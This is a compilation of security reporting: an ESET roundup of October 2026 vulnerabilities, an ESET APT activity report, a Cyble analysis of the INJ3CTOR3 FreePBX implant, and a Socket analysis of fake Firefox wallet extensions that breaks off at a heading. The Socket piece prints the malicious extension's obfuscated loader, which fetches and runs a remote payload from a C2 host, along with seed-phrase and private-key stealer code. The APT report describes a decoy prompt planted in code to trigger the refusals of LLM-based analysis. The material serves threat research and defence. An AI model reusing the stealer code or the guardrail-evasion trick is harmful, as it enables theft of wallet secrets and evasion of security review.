Title: Lessons from cybersecurity Black Week
Context: In the highest-risk setups, a demonstrated exploit can trigger the vulnerability before application code runs, meaning application-level authentication offers no protection
Full Text:
The week leading up to October 25, 2026, was every cyber defender’s nightmare: a barrage of critical vulnerabilities in PHP and the Linux kernel, a compromised LiteLLM release, a maximum-severity flaw in GitLab, a Node.js Brotli flaw, and a certificate authority incident affecting TLS trust.

A few years ago, a backlog like this would have filled a defender’s to-do list for a whole month. In the age of AI, all of this was reported within a single “Cybersecurity Black Week,” an exceptionally eventful seven-day period amid an already turbulent Black October. AI-assisted research helped uncover at least two of these flaws: PHP2Shell and the Brotli bug. On top of the breakneck patching pace, security teams faced mounting pressure to deliver status reports to other departments, management, customers, and the media.

Beyond their severity, the issues stood out for the variety of responses they demanded. Some required emergency runtime patches and upgrades; others called for containment, credential rotation, or the replacement of outdated certificate trust bundles. In several cases, installing the latest version was only the beginning of a long remediation process.

With so many problems landing at once, the main challenge was separating real risk from hype and prioritizing accordingly. Here is our assessment.

PHP2Shell: The loudest headline, with real-world limits

PHP2Shell generated the biggest media frenzy of the lot and, with it, a major headache for security teams, prompting many organizations to take their websites offline and look for emergency fixes. The name refers to two memory-safety vulnerabilities in PHP core, CVE-2026-109618 and CVE-2026-109619, affecting PHP versions 5.4 through 8.5.11. Both vulnerabilities received a CVSS v4.0 score of 9.2 and can allow unauthenticated remote code execution (RCE) on vulnerable PHP servers. In the highest-risk setups, a demonstrated exploit can trigger the vulnerability before application code runs, meaning application-level authentication offers no protection.

With PHP powering an estimated 69% of websites whose server-side programming language is known, government agencies in the United States, Europe, and elsewhere urged organizations to patch immediately, with some advising that affected internet-facing systems be isolated or taken offline if they could not be patched promptly. Government websites in the Netherlands, Germany, France, and other countries were temporarily taken offline as a precaution. The PHP project released fixes on October 21 in versions 8.5.12, 8.4.27, 8.3.36, and 8.2.35, along with source-only backports for the end-of-life 7.4, 8.0, and 8.1 branches. The rollout was complicated by a premature public leak, which forced the coordinated disclosure timeline forward.

While the flaws clearly belonged near the top of the patching list, early evidence suggested they were considerably harder to weaponize than initially feared. Successful exploitation requires specific conditions and knowledge of the target, and public proof-of-concept exploits did not work against a default PHP installation, according to Sansec.

On October 22, ESET was among nine security companies that told NBC News they had not seen any successful attacks, even though more than 200 proof-of-concept exploits were circulating. The remediation challenge extends beyond obvious web servers: PHP can also be embedded in appliances, network devices, management interfaces, and third-party products, while end-of-life PHP branches do not receive normal upstream binary releases.

Linux kernel: Reports went public before fixes were ready

As if the PHP issues weren’t severe enough, on October 21, Trend Micro’s Zero Day Initiative (ZDI) sent several reports on unpatched Linux kernel vulnerabilities to the kernel’s private security address while also copying public mailing lists. As a result, technical details of vulnerabilities for which fixes were not yet generally available became public, prompting stable kernel maintainer Greg Kroah-Hartman to question why the reports had been sent to public lists without patches.

The two most severe issues, both rated CVSS 9.0 by ZDI, affect KSMBD, the Linux kernel’s built-in SMB server. ZDI-CAN-33549 is an integer underflow in the SMB Direct path that could lead to RCE, while ZDI-CAN-33774 is a race condition that could also lead to RCE. Exploiting ZDI-CAN-33549 requires an RDMA-capable interface, a writable KSMBD share, and SMB Direct negotiation, significantly narrowing the number of systems exposed to that particular attack. Other reports concerned local privilege escalation vulnerabilities in the networking stack and the VMware graphics driver, as well as an information disclosure issue in the NVMe target code (NVMET).

To remediate, security teams had to track each report independently, consult distribution advisories, and restrict exposed services where practical while awaiting verified fixes. Kernel updates also required rebooting into the patched kernel and checking the running version, not merely confirming that a new package had been installed.

LiteLLM: Compromised, not merely vulnerable

On October 21, attackers published a malicious version of LiteLLM, 1.107.0, to PyPI and pushed compromised images to the project’s official container registries. According to the project’s incident report, its release pipeline was breached using GitHub CLI credentials associated with three developers. One of the stolen tokens belonged to an owner of the project’s GitHub organization, allowing attackers to disable branch protections and modify the release workflow to point to a lookalike repository. LiteLLM, a Python proxy for LLM providers, has about 23 million weekly downloads, and the malicious version remained available on PyPI for roughly two hours before it was quarantined. It was the project’s second supply-chain compromise of 2026, after malicious versions 1.82.7 and 1.82.8 appeared in March.

The payload combined a credential stealer with a second-stage remote access trojan (RAT). By abusing Python’s startup mechanisms, including a .pth file, it ran every time Python started, even if an application never imported LiteLLM. Execution therefore did not depend on exploiting an application flaw: simply running Python in an affected environment could be enough.

Affected environments had to be treated as potentially compromised, not merely vulnerable. According to LiteLLM, these included environments that ran litellm==1.107.0 and containers that executed affected images distributed under the v1.107.0, latest, main-latest, or main-stable tags during the compromised intervals. Removing or replacing the package was insufficient: teams needed to determine whether the malicious code had run, contain affected systems, rebuild from clean sources, and rotate exposed secrets from a clean environment. Cloud, source-control, and CI/CD logs also had to be reviewed for unauthorized activity.

Node2Shell: From Node.js to HTTP2Shell

Node2Shell (CVE-2026-111497) is an out-of-bounds write in Google’s Brotli decoder, which Node.js bundles. Malformed compressed input can cause crashes, memory disclosure, or potentially RCE when an application decompresses attacker-controlled Brotli data. This can happen through explicit decompression, compressed request bodies, or automatically decompressed responses. Node.js rates the flaw as high severity, while the broader Brotli vulnerability carries a CVSS v4.0 score of 9.2. According to Aikido, researchers demonstrated code execution against the official, unmodified Node.js 24.22.0 image on Linux ARM64. Although the exploit did not work on every attempt, the demonstration showed that exploitation was practical, if not universally reliable.

Node.js shipped fixes on October 21 in versions 22.23.4, 24.22.1, and 26.12.1, and Bun followed with version 1.4.4 or later. Node.js 25.x, 23.x, 20.x, and earlier releases are end-of-life and will not receive the fix. Within days, the story outgrew Node.js. The same decoder is compiled into the Python Brotli and brotlicffi packages as well as into other HTTP software, which led researchers to rename the issue HTTP2Shell. The operational challenge was therefore not simply upgrading a single runtime but identifying every container, serverless deployment, and library that bundles the vulnerable decoder. The issue was fixed upstream in Brotli 1.2.1. Notably, OpenAI’s Codex Security had reported the underlying bug, and the fix had been present in the Brotli source since February without being recognized as a security issue.

GitLab: Credential leaks and authorization failures

On October 21, GitLab shipped a critical out-of-band patch release (versions 19.5.1, 19.4.3, 19.3.6, 19.2.9, 19.1.9, 19.0.10, and 18.11.13) addressing 12 security vulnerabilities. The headline flaw, CVE-2026-110264, rated 10.0 under CVSS v3.1, is an integer overflow triggered when GitLab compiles a specially crafted regular expression. Under certain conditions, it could allow an unauthenticated attacker to execute arbitrary code on the server. The affected versions date back to GitLab 7.0.

The other fixes addressed credential exposure, cache poisoning, authorization bypasses, and failures to enforce membership or merge-request approval policies. Reported unauthenticated attack paths included exposure of sensitive credentials through internal response headers and manipulation of a shared OAuth/OIDC discovery cache, while other issues required authenticated access. GitLab did not publish individual severity scores or exploitability details for these issues.

GitLab.com and GitLab Dedicated were already patched, so the work fell on administrators of self-managed instances. GitLab strongly recommended upgrading immediately, but with a catch: the older backport releases (19.2.9, 19.1.9, 19.0.10, and 18.11.13) included only the critical fix, while the remaining 11 issues were fixed only in 19.3.6 and later. Administrators also had to verify that all deployment components had been updated and assess the potential exposure of credentials and private project data due to the fact that patching would not invalidate stolen credentials or reverse unauthorized changes.

eMudhra/emSign: Compromised certificate trust

The high-priority eMudhra/emSign incident involved no software vulnerability at all. Several eMudhra intermediate certificate authorities (CAs) had insecure private keys, meaning attackers could potentially create certificates that would be trusted through the affected emSign certificate chain. While browsers had updated their trust stores and revocation lists, some Python tooling continued to trust the compromised intermediate CAs through its own certificate bundles. This created a risk of man-in-the-middle (MITM) attacks against TLS connections, including those to python.org and pypi.org.

The Python Software Foundation urged users to upgrade immediately to at least certifi 2026.10.19, pip 26.2.2, and uv 0.13.4, and the Python core team shipped expedited releases 3.15.2, 3.14.10, 3.13.18, 3.12.16, and 3.11.18 to update the bundled pip. The updates had to reach every host, application, and existing virtual environment. Container images had to be rebuilt with layer caching disabled to fetch the latest system certificates. The decisive check was whether deployed clients rejected the compromised trust paths; simply upgrading Python was not enough.

Cutting through the noise

Cybersecurity Black Week showed that a severity score rarely tells the whole story. A 9.2-rated PHP flaw that attackers struggled to exploit, a 10.0-rated GitLab bug, exposed kernel reports with no patches, and a poisoned package that ran at Python startup each called for a different response. What they all had in common was a window of exposure: the time between disclosure and when the last affected system is patched. For the leaked kernel flaws, that window opened before any fix existed, and for end-of-life PHP versions, it may never fully close. This is where ESET’s multilayered protection comes in, using behavioural detection and other security mechanisms to help block exploitation attempts and keep systems protected until patches are applied.

At the same time, the signals defenders rely on were buried in noise, from scanning that was largely benign to a single behavioural rule firing hundreds of thousands of times in a week. What mattered most was quickly understanding which incidents actually affected an organization's environment and what each incident required. That is the problem ESET’s correlation engine, ESET LiveCortex, and its specialized cybersecurity model, ESET NeoCortex, are designed to solve: turning an overwhelming volume of raw data into understandable incidents so that defenders can act before attackers achieve their goals. To learn how they work, read Beyond the alert: How ESET is teaching AI to understand security incidents.

Title: ESET APT Activity Report Q2 2026–Q3 2026
Context: They represent only a subset of the cybersecurity intelligence made available to customers of ESET Threat Intelligence APT Reports
Full Text:
ESET APT Activity Report Q2 2026–Q2 2026 summarizes notable activities of selected advanced persistent threat (APT) groups documented by ESET researchers between April and September 2026. The operations presented here reflect the broader threat landscape observed during this period and highlight some of its key trends and developments. They represent only a subset of the cybersecurity intelligence made available to customers of ESET Threat Intelligence APT Reports.

During the monitored period, China-aligned groups conducted intelligence-collection operations primarily against governmental targets. FamousSparrow kept up its monitoring in South America, just as in the previous reporting period. In Southeast Asia and Oceania, China-aligned threat actors ran campaigns that appear to support Chinese law enforcement efforts against organized crime in the region. One threat actor targeted hotels in Palau, which seems to be increasingly used as a base for fraud-related organized crime. SlippyNunchucks deployed its DarkVigil toolset in Sri Lanka against Chinese-speaking individuals connected to fraud schemes, likely in the context of broader regional law enforcement efforts against financial crime. As scam compounds have become an issue for countries neighboring China, with direct negative effects on China itself, it is likely that China-aligned APT groups have supported law enforcement efforts in this area. Another, broader cluster of activity targeted Taiwanese organizations operating in the semiconductor industry. This focus on Taiwan’s semiconductor sector is consistent with long-running Chinese industrial espionage priorities, and the strategic importance of semiconductor supply chains to both economic competition and national security.

Middle East-aligned activity increased compared with the previous reporting period, driven mainly by the return of several established Iran-aligned groups. In the previous period, activity from these groups had declined, most likely because internet restrictions imposed by the Iranian regime hindered their own ability to operate effectively. FilthyFeline, a subgroup of OilRig, and MuddyWater resumed operations after a quieter period, with most activity directed at entities in Israel across multiple sectors; a smaller number of US companies were also affected. FilthyFeline also appears to have taken over activity against a cellular data service provider in Uzbekistan that had previously been compromised by BladedFeline, another OilRig subgroup. In parallel, we analyzed new or updated malware, suggesting renewed development activity within parts of the Iran-aligned ecosystem. We also discovered activity by Arid Viper, a Hamas-affiliated threat actor, against what appears to be the Palestinian Authority’s Ministry of Foreign Affairs and Expatriates or an affiliated governmental entity. Given the ongoing US-led peace process, as well as the long-standing rivalry between Hamas and the Palestinian Authority, this activity was potentially intended to collect intelligence on the Palestinian Authority’s diplomatic position and internal thinking regarding negotiations to reduce hostilities in the region.

North Korea-aligned threat actors did not deviate significantly from the types of targets seen in previous reporting periods. These include primarily technology and cryptocurrency companies, software developers, and other opportunistic targets. Alongside South Korea, Ukraine has become increasingly prominent among North Korea-aligned targets. This is likely related to growing ties between Russia and North Korea, and North Korea’s increasing involvement in Russia’s war against Ukraine, not only through indirect military support (munitions, etc.) but also through the deployment of North Korean soldiers. Alongside these broader trends, Lazarus resumed targeting of the drone sector, typically using recruitment-themed social engineering to gain initial access. The likely motivation is the increasingly important role that drone systems are playing in the war in Ukraine, where new tactics and capabilities are being tested. Access to such knowledge and manufacturing processes could provide North Korea with valuable know-how for developing its own drone-production capabilities. We also detected ScarCruft targeting an African country, which was probably intended either to maintain oversight of a North Korean worker scheme operating in the country or to monitor Russian activities there. Separately, DeceptiveDevelopment moved from fake job-interview lures to broader software supply-chain compromises, harvesting developer credentials and using that access to inject malicious code into public and private source code repositories.

Russia-aligned activity continued to support its war objectives, targeting governments, the defense sector, and military entities in Europe, with a substantially higher number of targets in Ukraine. Looking more closely at these activities, similarities between Russia-aligned and Belarus-aligned campaigns stand out, further supporting our hypothesis that threat actors aligned with the two countries are becoming operationally closer. Gamaredon’s operations, which are typically numerous, saw a significant decline. We suspect that this could be related to Ukrainian attacks on Crimea, where the group is suspected to operate, a broader restructuring of its operations, or other factors that we continue to assess. Despite this decline in activity, Gamaredon updated its PteroBox file stealer and started using new tools such as PteroPSDoor and Turla’s VBScript Rezzuar. PhantomCaptcha attempted to deploy spyware, which we named PrincessSpy, on Android devices while impersonating Ukrainian entities. We also identified an extensive campaign in Ukraine exploiting MDaemon mail servers, during which the attackers deployed two backdoor malware families, HELLAGE and HELLTAG.

North Korea’s expanding military cooperation with Russia has prompted expectations that North Korea-aligned cyberactivity might be starting to align more closely with Russian objectives in Ukraine. While some of their targeting interests overlap, notably around the drone sector, our telemetry more clearly points to Belarus-aligned groups acting as cyberproxies or force multipliers for Russia. We observed increased and more assertive activity from Belarus-aligned threat actors, with their operations increasingly reflecting Russia’s intelligence priorities in Ukraine in some areas. Most notably, we identified the first destructive cyberattack by a Belarus-aligned threat actor that we have documented in the European theater, marking a significant development in this threat nexus. According to our telemetry, FrostyNeighbor attacked a manufacturing company in Ukraine that plays an important role in the country’s transportation sector. This marks a notable escalation, as threat actors with a well-established history of destructive cyberoperations in Ukraine have, until now, been Russia-aligned.

Finally, we identified several cases of APT groups using AI and large language models (LLMs) at various stages of their operations. Threat actors used AI primarily to accelerate tasks that would otherwise require painstaking effort, including malware development and the creation of decoy websites. In some cases, this resembled vibe coding: rapid, prompt-driven drafting of code, with human operators adapting and integrating the results into their toolchains. We also discovered phishing lures containing images that were clearly AI-generated. In one notable case, Russia-aligned UAC-0099 inserted a decoy request for instructions on building a nuclear weapon into a script comment, apparently attempting to trigger the safety guardrails of LLM-based security analysis and prevent the inspection of the malicious code that followed.

Despite these developments, we have not noticed AI substantially reshaping the APT landscape over the past six months. While we cannot determine whether some operations may involve a higher degree of AI-driven automation, our telemetry continues to show hands-on-keyboard activity and operations that are not fully automated. Overall, our observations suggest that APT groups are currently using AI much like mainstream software developers: to accelerate software development, automate previously manual tasks, and assist with the analysis of large volumes of data, rather than to conduct fully autonomous malicious operations.

ESET products protect our customers’ systems from the malicious activities described in this report. Intelligence shared here is based mostly on proprietary ESET telemetry data and has been verified by ESET researchers.

ESET APT Activity Reports contain only a fraction of the cybersecurity intelligence data provided in ESET Threat Intelligence APT Reports. For more information, visit the ESET Threat Intelligence website.

Title: From Hijacked PBX to Stolen Trunk: INJ3CTOR3’s Campaign Evolves
Context: A successful disinfection stops the first route; only rotation stops the second
Full Text:
Executive Summary

In May, Cyble Research & Intelligence Labs (CRIL) documented JOMANGY, a PHP webshell generation deployed by INJ3CTOR3 with self-healing persistence channels and a built-in toll-fraud dialer.

Back then, the fraud ran through the victim's own PBX, so removing the implant would have stopped it. Artifacts we collected from the operator's C2 staging servers during mid-September 2026 show that this is no longer true: the installer now sends credentials off the box on every run, and a second staging host serves it.

INJ3CTOR3's FreePBX implant now uploads the victim's SIP trunk, AMI, database, and mail-relay credentials to the operator, so disinfecting or rebuilding an infected host no longer ends the exposure. Anyone running FreePBX, Issabel, or Elastix who suspects compromise must rotate the secrets in 17 configuration files, and only after the host is clean.

The infection and persistence code is nearly unchanged; what the operator rotated are the identifiers that were available to defenders since the last time. Each section below pairs a finding with what to do about it.

Key Takeaways

Credentials leave on every run. k.php uploads 17 configuration files to both staging hosts every minute the host stays infected.

The fraud no longer needs your PBX. A stolen trunk secret lets the operator register and place calls as you from anywhere.

Last report's identifiers have expired. Each build now carries its own watermark, and the webshell gate hash was rotated.

Two staging hosts. Plain-text commands now point to 160[.]119[.]69[.]4, while base64-encoded ones still use 45[.]95[.]147[.]178.

Clean-looking logs and consoles prove nothing. Requests through an encoded space reach the shell without being named in the access log, and trunks are written directly to /etc/asterisk; they do not appear in the FreePBX console.

The Campaign So Far

INJ3CTOR3 has been abusing Asterisk-based phone systems for toll fraud since at least 2020. Check Point Research named the operation that November, when it exploited CVE-2019-19006 in FreePBX and used a basic webshell to read amportal.conf and sip_additional.conf by hand. Unit 42 reported a related operation against Elastix in 2022, Fortinet documented the EncystPHP webshell in January 2026, and our May report covered JOMANGY.

The playbook has held for six years: scan for exposed PBXs, exploit or brute-force a way in, plant a password-gated webshell, and dial out at the victim's expense. Figure 1 below shows the chain as it stands in the September build, now including the credential upload back to the staging hosts.

Credential Exfiltration: The Implant Is No Longer the Product

The September k.php ends with two new base64-encoded lines, each holding 17 curl commands that upload one configuration file apiece to /hima_data/index.php, one line per staging host (See Figure 2 below). The paths are typed out by hand and cover FreePBX, Issabel, and Elastix layouts. The collector path echoes hima, a backdoor account the takeover script creates. The name goes back further: Check Point's 2020 INJ3CTOR3 report shows a Telegram post by a user called Hima sharing a tool that scans and cracks SIP ranges, saving its output as HimaResults.

Figure 2: k.php line 34, decoded into 17 file uploads

Three of the cron beacons fetch and run k.php every minute (the others every two or three minutes), so the upload repeats every minute during the infection. Rotating credentials on a still-infected host hands the new secrets to the operator within minutes.

This opens a second route to fraud. Our May report covered calls placed through the webshell, which require the shell to be alive and to land in the victim's own call records. With a stolen trunk secret, the operator can register to the carrier from any machine and call as the victim, leaving nothing on the host, unless the carrier also restricts the trunk to the victim's IP addresses. A successful disinfection stops the first route; only rotation stops the second.

Detection

Network: outbound HTTP POSTs from a PBX to any /hima_data/ path or to either staging host. A PBX seldom needs outbound web access beyond vendor updates, so egress allow-listing closes this channel.

Carrier: alert on trunk registrations from outside your own IP ranges, and on premium or international destinations, off-hours calling, and unusual concurrency. Set spend caps and destination blocks where your carrier offers them.

For Law Enforcement Agencies and CERTs

By design, victims' credentials were collected on the two staging hosts, which stopped responding in late September 2026. Going offline does not end exposure: hosting providers may still retain server data, and infected PBXs keep trying to upload their credentials every minute to addresses that could be reassigned to someone else.

Both are reasons for law enforcement and national CERTs, which have the legal standing that researchers lack, to work with the providers on preserving that data and sinkholing the addresses, which would also identify victims for notification. We saw the uploads in code; we did not capture one in transit and hold no victim list.

An infected host now talks to both staging hosts, and which one depends on whether the command was written in plain text or base64. The /x takeover script is byte-identical on both.

The Webshell: Same Program, New Identifiers

Decoded, the September JOMANGY panel is identical to April's except for the values defenders were told to look for.

Per-build watermark. Our May report advised hunting for trace_e1ebf9066a951be519a24140711839ea, present in every April copy. The September builds carry trace_bd42a8a0d23ae16c85dede7d2abaec05 (45[.]95[.]147[.]178) and trace_7544725ebaaadac217dfaa7ca8e8fe7e (160[.]119[.]69[.]4), so that hunt now misses current infections.

One gate for two generations. JOMANGY and ZenharR share a single hardcoded MD5 gate hash, rotated together from a2f6863413c4192a4abfa360577b9961 to 8b3a1d970fda0c17a0b785a990fb7b6a. Our May report listed the April value under ZenharR only.

A forged administrator session. Behind the gate, the FreePBX button builds an admin session using FreePBX's own ampuser class and setAdmin(); in our lab, it opened the full console without any password. Therefore, changing the FreePBX admin password affects neither the gate nor this session. (See Figure 3 below)

Figure 3: The panel's Freepbx and Elastix buttons forge an admin session without a password

Because each of these identifiers changes between builds, the detection approach later in this report focuses on who put a file on disk rather than on what the file contains.

The .htaccess Door and the Access-Log Gap

k.php writes a seven-line .htaccess to /var/www/html/admin/views/. It does not hide the webshell; it unblocks it, and it lets requests reach a copy without naming it.

Simulating an operator and a victim in an isolated environment, we confirmed that a request to a URL containing an encoded space returned a working webshell for the attacker. The access log records only the requested path, never the file that answered, so searching logs for the webshell by its filename can return nothing on a host that is serving it.

Defend: check every .htaccess across the web root for who put it there; one that no package, FreePBX module, or member of your team accounts for is suspect, whatever it contains. Because the takeover script wipes logs, treat log hunting as secondary: requests with %20, %09, or %0A directly after a slash that return 200 are worth a look where logs survive.

What the FreePBX Console Won't Show You

FreePBX lists the trunks it created from its own database; Asterisk reads whatever is in its configuration files. In our lab, a trunk we wrote directly into /etc/asterisk/pjsip_custom.conf carried a call while the FreePBX Trunks page reported no records (See Figure 4 below). We did not see the campaign plant one, but its root-equivalent accounts and stolen trunk secrets give the operator everything needed to do so.

Figure 4: Our lab trunk, known to Asterisk and carrying calls, invisible in the FreePBX console

Defend: audit from the Asterisk CLI (pjsip show endpoints, pjsip show registrations, sip show peers, sip show registry) and compare with what the console lists. Review the *_custom.conf files for trunks or contexts that nobody on your team added.

What Keeps It There

Before detecting or cleaning, it helps to see the whole apparatus. Everything in Figure 5 is read from /x and k.php: ways the implant stays on the box, and doors allowing the operator to come back, through a system account or a single web request. Each piece can rebuild/repair all others under a minute, which is why removing any one of them on its own fails. (See Figure 5 below)

Detecting It Without IOCs

The operator rotates hashes, watermarks, gate values, and hosts between builds, so asking whether a file is known-bad quickly stops working. The better question is who put the file there: compare what is on disk with what the package manager or a clean install says it should be.

On the host: triage with beagle.sh

However, it cannot tell you whether the credentials have already been left: that happens during the first cron run, within a minute of infection, and long before anyone scans. The upload leaves no file behind, and the takeover script wipes what might have recorded it: the web server, Asterisk, cron and audit logs, plus shell and MySQL histories, which makes forensic timelines hard to reconstruct.

The fraud itself

The last two catch the fraud rather than the machinery, whatever the files are called, and whether you ever find the shell. The host rows need process telemetry that PBX appliances rarely have, which is part of why so many stay infected.

Why Cleanup Fails, and the Order That Works

First move

Why it fails on its own

Delete the webshell

Cron re-runs k.php within minutes and rewrites all 12 copies, the .htaccess, and the immutable flags.

Patch FreePBX

Sangoma's advisory for CVE-2025-57819 states the fix prevents new exploitation but does not clean a compromised system.

Change the admin password

The gate and the forged session never use it, and the backdoor accounts bypass the FreePBX login.

Shadowserver data showed more than 900 compromised FreePBX instances in February 2026; over 700 of them were still compromised in May. Rebuilding from a clean image is the most reliable fix; if you clean in place, work from the system layer up, because it replants everything above it.

Preserve first

The takeover script truncates logs, then deletes them, and clears shell and database history, so evidence shrinks with every run:

Cut the host off from the internet, or at least block all outbound traffic except to your SIP carrier. Blocking only the two known staging hosts is not enough if the operator has moved. With no route out, the minute-by-minute downloads fail, and nothing more is uploaded. One local loop survives: a watchdog cron line re-runs the cached copy of k.php at /var/lib/asterisk/bin/zen2 every minute, rebuilding the webshells offline, which is why cron comes first in the cleanup below.

Capture all crontabs and the eight backups listed below, /etc/passwd, /etc/shadow, shell profiles, and the web root with lsattr output and change times.

Export the FreePBX ampusers table, the call records database, and the Asterisk full log, and ask your carrier to preserve CDRs and registration logs.

Then clean, in this order

Cron and its spares. Clear root's crontab in one go, so the restore and watchdog lines are removed. Then kill any running zen2, devnull2, or serv processes; killed earlier, the watchdog restarts them within a minute. Remove the k.php beacons (/var/lib/asterisk/bin/zen2, devnull2, zen222, devnull312, devnull212, /tmp/.cache/update, /dev/shm/.systemd/kernel). Unlock (chattr -i, -a) and delete the eight crontab backups: /usr/lib/.systemd/.cache, /usr/share/.fonts/.config, /var/lib/.dbus/.data, /var/tmp/.X11/.Xauthority, /opt/.local/.bashrc, /var/cache/.fontconfig/.cfg, /etc/.ssl/.cert, and /root/.config/.pref.

Login and boot triggers. Remove the base64 stager from /root/.bash_profile, /root/.bashrc, and /etc/rc.local.

Accounts and SSH. Remove every extra UID-0 account and any account whose /etc/shadow hash begins with $1$nRz1Cbtk$ (legitimate service accounts with that hash need new passwords, not deletion). Restore sshd_config, where root login was re-enabled.

Web application. Remove the 12 webshell copies, the .htaccess, the freepbxusers row in ampusers, and /var/www/html/admin/modules/freepbx_ha/license.php.

Credentials. Only now rotate the secrets in the 17 files and across every account on the host.

Conclusion

The hard part of the campaign used to be getting the implant off the box, and that has not changed. What has changed is that the box is no longer the whole problem: an organization that rebuilds but does not rotate has removed the operator's calling platform and handed over its carrier account.

The code ties this generation to the actor in our May report through the takeover script, backdoor hash, and staging host, and a gate rotated in step across JOMANGY and ZenharR.

The operator is now rotating exactly the strings defenders were given, so detections built on provenance and behavior will outlast this build, and detections built on its hashes will not. CRIL continues to monitor INJ3CTOR3's infrastructure.

Title: Malicious Firefox Extensions Impersonate Phantom, Jupiter, and Bitget to Steal Wallet Secrets
Context: Socket’s Threat Research Team identified a cluster of malicious Firefox extensions that impersonate well-known crypto wallets and steal recovery phrases and private keys
Full Text:
Socket’s Threat Research Team identified a cluster of malicious Firefox extensions that impersonate well-known crypto wallets and steal recovery phrases and private keys. The extensions use Unicode homoglyphs to copy the names of Phantom, Jupiter, and Bitget, and they route stolen secrets to brand-named subdomains of a single command-and-control apex, bonto[.]io. Each signed package carries a complete, always-on stealer, so the malicious code is present in what Mozilla reviewed. The Phantom impersonator adds a second layer: a loader that pulls a stealer from a server at runtime and runs it in the page, letting the operator swap or refresh the payload after review. All three listings were live on Firefox Add-ons during analysis and have been removed as of publication.

The campaign breaks down as follows:

Phantom impersonator (add-on ID 3092199): a small loader inside the signed extension fetches a second-stage stealer from phantom[.]bonto[.]io/config and runs it in the main world of every page the victim opens, and also bundles a stealer and the operator’s drainer backend.

Jupiter and Bitget impersonators (IDs 3092666 and 3092059): the stealer is bundled in the package and routes stolen secrets to jupiter[.]bonto[.]io and bitget[.]bonto[.]io.

Shared infrastructure: at least five brand-named subdomains of bonto[.]io are provisioned as exfiltration hosts, including coinbase[.]bonto[.]io and exodus[.]bonto[.]io, each listing published from its own throwaway AMO (Addons.Mozilla.Org) developer account.

What the Extensions Pretend to Be #

Each listing impersonates a real wallet. The Phantom listing sets its public display name to the string 𝐏ha𝐧†օ𝗺, built from Unicode homoglyphs that render on the page as “Phantom,” and reuses Phantom’s real ghost icon and marketing copy, including the heading “OFFICIAL PHANTOM WALLET (Firefox Update).” The Jupiter listing renders as “Jupiter” and claims to be “Built by Jupiter Exchange.” The Bitget extension’s manifest name is “TabFlow Pro,” while its listing presents Bitget Wallet branding to users.

These are among the most widely used crypto wallets, which is the reputation the campaign trades on. The impersonation is cross-ecosystem: the real Phantom shows 5,000,000 users on the Chrome Web Store and roughly 83,000 daily users on Firefox Add-ons, and these fakes ride that brand recognition.

The Phantom impersonator renders as “Phantom by Phantom” with the genuine ghost icon, and its rating was inflated to 3.9 across 546 reviews at the time of writing.

The extensions request the permissions the theft needs, and the listings declare no data collection. The Phantom impersonator requests access to browser tabs and to data for all websites, and its Permissions and data panel states that the developer says the extension does not require data collection. The developer supplied no privacy policy.

The listing requests access to data for all websites while declaring that it does not require data collection.

How the Theft Works #

A Loader That Fetches a Second Stage

The signed Phantom package carries a benign-looking wallet bundle plus a loader appended to background/serviceWorker.js. The loader rebuilds its C2 host from a character-code array, requests a configuration object, decodes a base64 payload, and runs it as code inside the page. It injects into the main world first, which gives it access to page objects such as the wallet’s own injected provider, and falls back to the isolated content-script world. It re-injects on every tab load and on install and startup.

// loads optional analytics module on first run (function(){ var _c=[112,104,97,110,116,111,109,46,98,111,110,116,111,46,105,111].map(function(n){return String.fromCharCode(n);}).join(''); var _cfg='https://'+_c+'/config'; var _sk='_px'; async function _inj(tabId,src){ // try MAIN world first (works on http/https dapp tabs, gives us window access) // fall back to ISOLATED (works on moz-extension:// own pages, still reads DOM/inputs) try{ await browser.scripting.executeScript({ target:{tabId:tabId}, func:function(c){(0,eval)(c);}, args:[src], world:'MAIN' }); return; }catch(e){} try{ await browser.scripting.executeScript({ target:{tabId:tabId}, func:function(c){(0,eval)(c);}, args:[src] }); }catch(e){} } async function _init(){ try{ var r=await fetch(_cfg,{cache:'no-store'}); var cfg=await r.json(); if(!cfg.active||!cfg.code)return; var src=atob(cfg.code); await browser.storage.local.set({[_sk]:src}); var tabs=await browser.tabs.query({}); for(var i=0;i<tabs.length;i++){ var tab=tabs[i]; if(!tab.id||tab.id<0)continue; await _inj(tab.id,src); } }catch(e){} } browser.tabs.onUpdated.addListener(async function(tabId,info){ if(info.status!=='complete')return; try{ var data=await browser.storage.local.get(_sk); if(!data[_sk])return; await _inj(tabId,data[_sk]); }catch(e){} }); browser.runtime.onInstalled.addListener(function(){setTimeout(_init,2000);}); browser.runtime.onStartup.addListener(function(){setTimeout(_init,2000);}); setTimeout(_init,2000); })();

The character-code array decodes to phantom[.]bonto[.]io, and the comment claiming the code loads an analytics module is the threat actor’s own disguise.

The Server Decides When and What to Steal

The configuration endpoint returns a JSON object with an active flag and a base64 code field. Because the payload is delivered at runtime, the operator controls both whether the stealer runs and what it does, with no new submission to Mozilla. The endpoint can return an inert response during review and the live stealer afterward. At the time of writing, phantom[.]bonto[.]io/config returned active: true and a 4,029-byte payload.

The returned stage is a recovery-phrase and private-key stealer. It classifies captured strings, detecting BIP-39 seed-phrase word counts (12, 15, 18, or 24 words) and both Ethereum (EVM) and Solana private-key formats.

function _isSeedWords(arr){ return (arr.length===12||arr.length===15||arr.length===18||arr.length===24)&&arr.every(function(w){return/^[a-z]{3,8}$/.test(w);}); } function _isKey(s){ if(typeof s!=='string')return false; return/^(0x)?[0-9a-fA-F]{64}$/.test(s.trim())||/^[1-9A-HJ-NP-Za-km-z]{87,88}$/.test(s.trim()); }

It captures secrets through several paths: reading every input and textarea value, listening for paste and focusout events, and scanning page text for a numbered recovery-phrase grid of the kind shown on a wallet’s reveal-secret-phrase screen.

var re=/\b\d{1,2}[\.\):\s]\s*([a-z]{3,8})\b/gi;

Because it runs in the main world, it also hooks the page’s injected Solana provider to capture the connected public key.

var _ps=window.phantom&&window.phantom.solana; if(_ps&&_ps.connect){ var _oc=_ps.connect.bind(_ps); _ps.connect=function(o){ return _oc(o).then(function(r){ try{_post({type:'input',data:{solana_pubkey:r&&r.publicKey&&r.publicKey.toString()}});}catch(e){} return r; }); }; }

Captured data is posted as JSON to the C2 host, with an XMLHttpRequest fallback and a simple set to avoid sending the same value twice.

function _post(data){ var k=JSON.stringify(data); if(_sent[k])return; _sent[k]=1; try{fetch(_ep,{method:'POST',headers:{'Content-Type':'application/json'},body:k,keepalive:true}).catch(function(){});} catch(e){try{var x=new XMLHttpRequest();x.open('POST',_ep,true);x.setRequestHeader('Content-Type','application/json');x.send(k);}catch(e2){}} }

The Bundled Variant

